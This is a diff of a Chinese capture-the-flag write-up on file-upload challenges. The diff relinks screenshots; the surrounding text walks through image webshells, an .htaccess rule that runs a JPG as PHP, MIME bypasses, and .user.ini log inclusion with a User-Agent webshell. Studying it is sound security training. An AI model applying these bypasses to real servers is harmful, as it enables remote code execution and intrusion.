-[![image-20231105195122914](https://image.3001.net/images/20240114/1705219574_65a395f694b104d51f8a1.png)](https://image.3001.net/images/20240114/1705219574_65a395f694b104d51f8a1.png)
+[![image-20231105195122914](../../../_assets/images/1bdea218c1d27a4bcc580fc6fb7e5e54d15fd0d500a3ba8f3c3d42345e8ccfdf.png)](https://image.3001.net/images/20240114/1705219574_65a395f694b104d51f8a1.png)
 
 接着将该图片上传，点击查看图片，会跳转到如下页面：
 
-[![image-20231105195210849](https://image.3001.net/images/20240114/1705219571_65a395f3c1dd0b42f5862.png)](https://image.3001.net/images/20240114/1705219571_65a395f3c1dd0b42f5862.png)
+[![image-20231105195210849](../../../_assets/images/722a815691c24e9b264ff95d440b5ac128a275a47da9ce77a28eea6f042d4b7b.png)](https://image.3001.net/images/20240114/1705219571_65a395f3c1dd0b42f5862.png)
 
 根据传参的形容猜测可能是文件包含，尝试直接包含我们的图片马文件进行利用。最终得到 FLAG。
 
-[![image-20231105195540340](https://image.3001.net/images/20240114/1705219569_65a395f1f0948b26c7472.png)](https://image.3001.net/images/20240114/1705219569_65a395f1f0948b26c7472.png)
+[![image-20231105195540340](../../../_assets/images/c7c87454d26acc5ff875772e8c7c19302b1a849eeb3a5f10f7023505dcaffa2e.png)](https://image.3001.net/images/20240114/1705219569_65a395f1f0948b26c7472.png)
 
 ## web165 JPG 二次渲染绕过
 
 这里我们准一张图片：
 
-[![image-202311061010](https://image.3001.net/images/20240114/1705219557_65a395e54dc2c7dbfde0f.jpg)](https://image.3001.net/images/20240114/1705219557_65a395e54dc2c7dbfde0f.jpg)
+[![image-202311061010](../../../_assets/images/c3c564dc56fdc8c551df7b12ee0d223b8db8159c2ae25b9e3c9c372bea412b1a.jpg)](https://image.3001.net/images/20240114/1705219557_65a395e54dc2c7dbfde0f.jpg)
 
 **将该图片上传并下载下来**，接着使用如下脚本生成图片马即可。
 
@@ -490,11 +490,11 @@ php jpg_payload.php download.jpg
 # 其中的download.jpg为上传之后下载的JPG图片。
 ```
 
-[![image-20231106214325713](https://image.3001.net/images/20240114/1705219554_65a395e26d4466b07332d.png)](https://image.3001.net/images/20240114/1705219554_65a395e26d4466b07332d.png)
+[![image-20231106214325713](../../../_assets/images/ac8c974132f413cf8369e193c2e6787dec8c59188135a31cd1d6e23e9a70cf65.png)](https://image.3001.net/images/20240114/1705219554_65a395e26d4466b07332d.png)
 
 最后将生成的 `payload_download.jpeg` 图片修改为 `payload_download.jpg` 上传即可。
 
-[![image-20231106214822437](https://image.3001.net/images/20240114/1705219550_65a395deeccea0d5f13b5.png)](https://image.3001.net/images/20240114/1705219550_65a395deeccea0d5f13b5.png)
+[![image-20231106214822437](../../../_assets/images/5784c6c4d28cbcacebda6a565cb3699dc1b59ba4f95110090d38a7381fa887ba.png)](https://image.3001.net/images/20240114/1705219550_65a395deeccea0d5f13b5.png)
 
 ## web166 压缩包包含利用
 
@@ -506,33 +506,33 @@ php jpg_payload.php download.jpg
 
 这里随便压缩一个文件，将其上传：
 
-[![image-20231107085112115](https://image.3001.net/images/20240114/1705219547_65a395dbb534ece8e034c.png)](https://image.3001.net/images/20240114/1705219547_65a395dbb534ece8e034c.png)
+[![image-20231107085112115](../../../_assets/images/6b668bb8fb3e8b2d6540a6be6d33c41a4664f73ea91fa8cdebd7cfbb30127310.png)](https://image.3001.net/images/20240114/1705219547_65a395dbb534ece8e034c.png)
 
 当我们上传成功之后，这里提示下载该文件：
 
-[![image-20231107085149686](https://image.3001.net/images/20240114/1705219544_65a395d8a4f3e6a688a6f.png)](https://image.3001.net/images/20240114/1705219544_65a395d8a4f3e6a688a6f.png)
+[![image-20231107085149686](../../../_assets/images/de858c0846199f7f81c9b16ec319d377d0eb7818688602f8deaf6deacde18ead.png)](https://image.3001.net/images/20240114/1705219544_65a395d8a4f3e6a688a6f.png)
 
 点击之后跳转到如下页面：
 
-[![image-20231107085207238](https://image.3001.net/images/20240114/1705219542_65a395d6c14bb6786def4.png)](https://image.3001.net/images/20240114/1705219542_65a395d6c14bb6786def4.png)
+[![image-20231107085207238](../../../_assets/images/3a5bfe4373f8f6aa81ff708a86898823bdf685f7e810f59209c2fb882e0f1f41.png)](https://image.3001.net/images/20240114/1705219542_65a395d6c14bb6786def4.png)
 
 通过 URL 发现，猜测这里可能是文件包含，我们这里可以使用如下两种方法：
 
 1. 准备一个一句话木马文件进行压缩，然后将压缩包上传。
 
-[![image-20231107085501299](https://image.3001.net/images/20240114/1705219540_65a395d4983699417f3d4.png)](https://image.3001.net/images/20240114/1705219540_65a395d4983699417f3d4.png)
+[![image-20231107085501299](../../../_assets/images/3197a629e7877b4382d0bbabcf54f28ab4a5ff4e7f4411f932069c85d1b48dc9.png)](https://image.3001.net/images/20240114/1705219540_65a395d4983699417f3d4.png)
 
 1. 也可以直接通过 BP 修改 Content-Type 值以及文件名后缀上传即可。
 
-[![image-20231107085717176](https://image.3001.net/images/20240114/1705219538_65a395d23d887c4d29a1b.png)](https://image.3001.net/images/20240114/1705219538_65a395d23d887c4d29a1b.png)
+[![image-20231107085717176](../../../_assets/images/46b5d02a5c2fce9e262d88daa018ec5be085ec45f314c12af5cc3cd4ac7080d4.png)](https://image.3001.net/images/20240114/1705219538_65a395d23d887c4d29a1b.png)
 
 这里我使用第二种方法，上传完成之后，直接可以下载文件：
 
-[![image-20231107085843242](https://image.3001.net/images/20240114/1705219534_65a395cecd6314ff44283.png)](https://image.3001.net/images/20240114/1705219534_65a395cecd6314ff44283.png)
+[![image-20231107085843242](../../../_assets/images/49918a0ab161b6d0a727f0e4a4d7fa509e6e82865e9750aa4c8b550813588ca8.png)](https://image.3001.net/images/20240114/1705219534_65a395cecd6314ff44283.png)
 
 通过 BP 抓包下载文件时发送的请求，由于这里是使用文件包含的形式，因此可以直接利用该 ZIP 木马。
 
-[![image-20231107085958575](https://image.3001.net/images/20240114/1705219531_65a395cb3856dbf575a37.png)](https://image.3001.net/images/20240114/1705219531_65a395cb3856dbf575a37.png)
+[![image-20231107085958575](../../../_assets/images/4411da0b34c45ea7c2527ca8d39feae0504fe80d5e09c1ce766c9dc69b8e3184.png)](https://image.3001.net/images/20240114/1705219531_65a395cb3856dbf575a37.png)
 
 ## web167 .htaccess 文件的利用
 
@@ -540,15 +540,15 @@ php jpg_payload.php download.jpg
 
 经过测试发现，这里**可以通过修改 `content-type` 值为图片类型，可以上传任意 非 php 后缀的文件**。
 
-[![image-20231107090725257](https://image.3001.net/images/20240114/1705219527_65a395c736c30f4fe2b78.png)](https://image.3001.net/images/20240114/1705219527_65a395c736c30f4fe2b78.png)
+[![image-20231107090725257](../../../_assets/images/dd18087eef7053bc55e8033ee640218dd8a9b84dcd05496a4ab289900527f424.png)](https://image.3001.net/images/20240114/1705219527_65a395c736c30f4fe2b78.png)
 
 但是不能上传 php 后缀的文件：
 
-[![image-20231107090803567](https://image.3001.net/images/20240114/1705219524_65a395c42b759d57c2c18.png)](https://image.3001.net/images/20240114/1705219524_65a395c42b759d57c2c18.png)
+[![image-20231107090803567](../../../_assets/images/500556a39e9a95332d3b652a3d65f3b99ffc478ca4c74bbff5026030136e00a2.png)](https://image.3001.net/images/20240114/1705219524_65a395c42b759d57c2c18.png)
 
 可以上传 `.phtml` 后缀的文件，但是服务器不解析。
 
-[![image-20231107090821729](https://image.3001.net/images/20240114/1705219521_65a395c15d3891be39cd7.png)](https://image.3001.net/images/20240114/1705219521_65a395c15d3891be39cd7.png)
+[![image-20231107090821729](../../../_assets/images/a4bc01c374382150e1d22e43816978ab4a8885445c2999af30f4dc0f8dc88ebb.png)](https://image.3001.net/images/20240114/1705219521_65a395c15d3891be39cd7.png)
 
 由于题目提示是 `httpd` 尝试上传 `.htaccess` 文件。
 
@@ -561,17 +561,17 @@ SetHandler application/x-httpd-php
 </FilesMatch>
 ```
 
-[![image-20231107091835153](https://image.3001.net/images/20240114/1705219516_65a395bc1378353ec7b45.png)](https://image.3001.net/images/20240114/1705219516_65a395bc1378353ec7b45.png)
+[![image-20231107091835153](../../../_assets/images/52b9049b458eb511b5c433a6002ada9bd6611aa55435fe8c56d220c765e1eda1.png)](https://image.3001.net/images/20240114/1705219516_65a395bc1378353ec7b45.png)
 
 接着上传名为 `x1ong.jpg` 的文件，内容为一句话木马，访问即可利用：
 
-[![image-20231107092006412](https://image.3001.net/images/20240114/1705219513_65a395b91bf3aae640fee.png)](https://image.3001.net/images/20240114/1705219513_65a395b91bf3aae640fee.png)
+[![image-20231107092006412](../../../_assets/images/293fd9a5fad95b4039da96b2e9baadc24bce7beac8d8ac74aef2fb222a6181af.png)](https://image.3001.net/images/20240114/1705219513_65a395b91bf3aae640fee.png)
 
-[![image-20231107092037400](https://image.3001.net/images/20240114/1705219510_65a395b6a9fa28e7073d0.png)](https://image.3001.net/images/20240114/1705219510_65a395b6a9fa28e7073d0.png)
+[![image-20231107092037400](../../../_assets/images/0a214053849255f63f72dee1e150a8fe4603280ab96864ab297b27b41a2be6bc.png)](https://image.3001.net/images/20240114/1705219510_65a395b6a9fa28e7073d0.png)
 
 以下是 apache httpd 官方文档对 `.htaccess` 文件的解释：
 
-[![image-20231107092229894](https://image.3001.net/images/20240114/1705219507_65a395b3df2aad322cac9.png)](https://image.3001.net/images/20240114/1705219507_65a395b3df2aad322cac9.png)
+[![image-20231107092229894](../../../_assets/images/cddedf36bfb52dd33e7e827997049bc2bb83290af0c1d3ffc8a0f25d7ee93a9e.png)](https://image.3001.net/images/20240114/1705219507_65a395b3df2aad322cac9.png)
 
 而 `FileMatch` 则表示匹配，对 `x1ong.jpg` 使用规则 `SetHandler application/x-httpd-php` 表示将该图片交给 PHP 去执行。
 
@@ -583,13 +583,13 @@ SetHandler application/x-httpd-php
 
 通过测试发现这里可以通过 **前端校验 + MIME 绕过** 即可上传 php 后缀的文件，并且该 php 可以自己解析。
 
-[![image-20231107093107598](https://image.3001.net/images/20240114/1705219501_65a395adaa15a78a64884.png)](https://image.3001.net/images/20240114/1705219501_65a395adaa15a78a64884.png)
+[![image-20231107093107598](../../../_assets/images/7e38941e495977940b8f66f93ea72c07aeb0e71d135b018dbb05b5c0b7e47f3a.png)](https://image.3001.net/images/20240114/1705219501_65a395adaa15a78a64884.png)
 
-[![image-20231107093116137](https://image.3001.net/images/20240114/1705219498_65a395aa0127772757b45.png)](https://image.3001.net/images/20240114/1705219498_65a395aa0127772757b45.png)
+[![image-20231107093116137](../../../_assets/images/072f913e758e586dd4d976372eaa19fc4b3a7c037180a07a9a838935038c30eb.png)](https://image.3001.net/images/20240114/1705219498_65a395aa0127772757b45.png)
 
 但是我们上传一句话木马的时候，页面返回 `null`。
 
-[![image-20231107093221688](https://image.3001.net/images/20240114/1705219494_65a395a6deb7cf80eacef.png)](https://image.3001.net/images/20240114/1705219494_65a395a6deb7cf80eacef.png)
+[![image-20231107093221688](../../../_assets/images/7ca61e433b66fed5d446ce250105795cc760926de58b0b7de4d57a50b858fbf1.png)](https://image.3001.net/images/20240114/1705219494_65a395a6deb7cf80eacef.png)
 
 猜测这里需要做免杀。这里发现服务器使用的是 PHP7.3 的版本，
 
@@ -609,55 +609,55 @@ php
 ?>
 ```
 
-[![image-20231107094126629](https://image.3001.net/images/20240114/1705219492_65a395a407ed87e796abf.png)](https://image.3001.net/images/20240114/1705219492_65a395a407ed87e796abf.png)
+[![image-20231107094126629](../../../_assets/images/70c0500dd0b4cd1b41e9d2ea569930b5e980798ec80523235c8806192fdae1f6.png)](https://image.3001.net/images/20240114/1705219492_65a395a407ed87e796abf.png)
 
-[![image-20231107094227500](https://image.3001.net/images/20240114/1705219489_65a395a1d843fbb4cdade.png)](https://image.3001.net/images/20240114/1705219489_65a395a1d843fbb4cdade.png)
+[![image-20231107094227500](../../../_assets/images/9a0bd09671b35512589158ab174e3d6b66d55d161214de667fb855b76958c918.png)](https://image.3001.net/images/20240114/1705219489_65a395a1d843fbb4cdade.png)
 
 FLAG 不在这里。经过查看发现 FLAG 在网站根目录下名为 `flagaa.php` 文件。
 
-[![image-20231107094336229](https://image.3001.net/images/20240114/1705219486_65a3959e8a620c0a7ca8e.png)](https://image.3001.net/images/20240114/1705219486_65a3959e8a620c0a7ca8e.png)
+[![image-20231107094336229](../../../_assets/images/0d508fae842ae704e94bed9942eb8d52d1af0ff052d2510b15cbf9e5e5d2ebe7.png)](https://image.3001.net/images/20240114/1705219486_65a3959e8a620c0a7ca8e.png)
 
 ## web169-170 高级免杀
 
 经过测试发现这里是 **前端要求上传 zip 后端要求上传 JPG**， 我们这里绕过一下即可：
 
-[![image-20231107100324042](https://image.3001.net/images/20240114/1705219483_65a3959b4312b7e7f8396.png)](https://image.3001.net/images/20240114/1705219483_65a3959b4312b7e7f8396.png)
+[![image-20231107100324042](../../../_assets/images/7c42e310c82e33d8ca591b3af7e69154b41940b1481da65061adccf4e2ad7f1b.png)](https://image.3001.net/images/20240114/1705219483_65a3959b4312b7e7f8396.png)
 
 当我们上传内容为 `<` 的时候，这里提示 `null`，没有上传成功。但是当我们上传内容为 `123` 的时候，发现可以成功上传，并且可以访问：
 
-[![image-20231107100427094](https://image.3001.net/images/20240114/1705219480_65a39598db92e15e21f95.png)](https://image.3001.net/images/20240114/1705219480_65a39598db92e15e21f95.png)
+[![image-20231107100427094](../../../_assets/images/f3204d302a3bd21bdc1224471c6b04932f2af440432327fddd2a81cd8023e7e3.png)](https://image.3001.net/images/20240114/1705219480_65a39598db92e15e21f95.png)
 
-[![image-20231107100448618](https://image.3001.net/images/20240114/1705219478_65a39596a8a7cd8837fb0.png)](https://image.3001.net/images/20240114/1705219478_65a39596a8a7cd8837fb0.png)
+[![image-20231107100448618](../../../_assets/images/5e76cd1baddc141124d4b4c2702d6e96cba90cfbc2f4a52cf61ccbd646dfb809.png)](https://image.3001.net/images/20240114/1705219478_65a39596a8a7cd8837fb0.png)
 
 由于过滤了 `<`，那么就没有办法执行 PHP 代码了，只能尝试通过上传 `.user.ini` 文件包含日志或者使用伪协议。
 
 **1. 使用伪协议无法上传，大小写无法绕过 php 关键字。**
 
-[![image-20231107101429288](https://image.3001.net/images/20240114/1705219476_65a3959431ab54563b46f.png)](https://image.3001.net/images/20240114/1705219476_65a3959431ab54563b46f.png)
+[![image-20231107101429288](../../../_assets/images/2eb42517711249757e1780ba1b8d12fb372e9cbc08f314e37a2ee2059444e06c.png)](https://image.3001.net/images/20240114/1705219476_65a3959431ab54563b46f.png)
 
 **2. 包含日志成功上传：**
 
-[![image-20231107101404508](https://image.3001.net/images/20240114/1705219474_65a395920eae2dff799e7.png)](https://image.3001.net/images/20240114/1705219474_65a395920eae2dff799e7.png)
+[![image-20231107101404508](../../../_assets/images/1a066bdffeac0ca658cdb53e30ec72e96c64d1008e34f24a089a3a23a5483ebd.png)](https://image.3001.net/images/20240114/1705219474_65a395920eae2dff799e7.png)
 
 包含日志上传成功了， 我们访问 upload 目录，发现 upload 目录下并没有 `index.php` 或者 其他 PHP 文件，导致 `.user.ini` 无法包含。
 
-[![image-20231107100823806](https://image.3001.net/images/20240114/1705219471_65a3958fde180e473fe3d.png)](https://image.3001.net/images/20240114/1705219471_65a3958fde180e473fe3d.png)
+[![image-20231107100823806](../../../_assets/images/20853821d0188d099c902906cf1e93b48551e9fa12605db140d14289cf45ebe3.png)](https://image.3001.net/images/20240114/1705219471_65a3958fde180e473fe3d.png)
 
 那么这里我们可以上传一个名为 `index.php` 或者其他文件名的文件。
 
-[![image-20231107100901894](https://image.3001.net/images/20240114/1705219468_65a3958c3005a69f3e89f.png)](https://image.3001.net/images/20240114/1705219468_65a3958c3005a69f3e89f.png)
+[![image-20231107100901894](../../../_assets/images/77c2ca52cf92e2ae54e219609f63d8be1ccf172d0936a7454be3cf8de193fb4e.png)](https://image.3001.net/images/20240114/1705219468_65a3958c3005a69f3e89f.png)
 
 接着访问 `x1ong.php` 文件，即可自动包含 `/var/log/nginx/access.log` 文件。
 
-[![image-20231107101738660](https://image.3001.net/images/20240114/1705219465_65a395897e60ad167668b.png)](https://image.3001.net/images/20240114/1705219465_65a395897e60ad167668b.png)
+[![image-20231107101738660](../../../_assets/images/a0edc97f329bb8f9642228e3148d5b927153b25db67e58522198ac3e8f988fe3.png)](https://image.3001.net/images/20240114/1705219465_65a395897e60ad167668b.png)
 
 修改 UA 字段为一句话木马：
 
-[![image-20231107102443819](https://image.3001.net/images/20240114/1705219462_65a39586aabcfd9cfe27b.png)](https://image.3001.net/images/20240114/1705219462_65a39586aabcfd9cfe27b.png)
+[![image-20231107102443819](../../../_assets/images/701ea78205b44d9fd1fec1c667a5602fcd38f0910aa436222b1bcc034213f7ed.png)](https://image.3001.net/images/20240114/1705219462_65a39586aabcfd9cfe27b.png)
 
 最后利用即可：
 
-[![image-20231107102646878](https://image.3001.net/images/20240114/1705219457_65a39581ad685bab8893c.png)](https://image.3001.net/images/20240114/1705219457_65a39581ad685bab8893c.png)
+[![image-20231107102646878](../../../_assets/images/44adbf947164f60b0d4ab11fa6fbcd8e6a6ccf75f58e6c24a15df7781eaa9b4d.png)](https://image.3001.net/images/20240114/1705219457_65a39581ad685bab8893c.png)
 
 ## 参考来源
 
